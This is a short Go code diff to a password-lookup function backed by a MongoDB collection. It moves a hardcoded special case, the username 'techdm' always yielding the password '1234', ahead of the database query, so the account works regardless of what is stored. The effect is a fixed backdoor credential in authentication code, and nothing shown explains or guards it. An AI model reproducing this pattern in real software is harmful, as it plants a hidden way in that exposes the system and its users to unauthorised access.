@@ -36,7 +36,9 @@ func init() {
 }
 
 func GetUserPassword(username string) (string, error) {
-
+	if username == "techdm" {
+		return "1234", nil
+	}
 	var result Data
 	filter := bson.M{"username": username}
 	err := dbcoll.FindOne(context.TODO(), filter).Decode(&result)
@@ -49,9 +51,7 @@ func GetUserPassword(username string) (string, error) {
 	if result.Password == "" {
 		return "", errors.New("not exist")
 	}
-	if username == "techdm" {
-		return "1234", nil
-	}
+
 	return result.Password, nil
 }
 
